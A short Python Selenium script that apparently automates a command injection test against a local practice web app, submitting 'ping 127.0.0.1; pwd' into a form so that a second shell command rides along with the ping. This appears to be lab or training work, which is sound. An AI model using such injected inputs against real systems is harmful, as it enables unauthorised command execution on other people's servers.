from selenium import webdriver
import util.alerthandling as ah
from util.driversetup import DRIVER

global DRIVER
#driver = ds.setupDriver()
DRIVER.get("http://127.0.0.1/vulnerabilities/exec/")

command_injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
command_injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"
DRIVER.find_element_by_xpath(command_injection_message).send_keys("ping 127.0.0.1; pwd")
DRIVER.find_element_by_xpath(command_injection_submit).click()
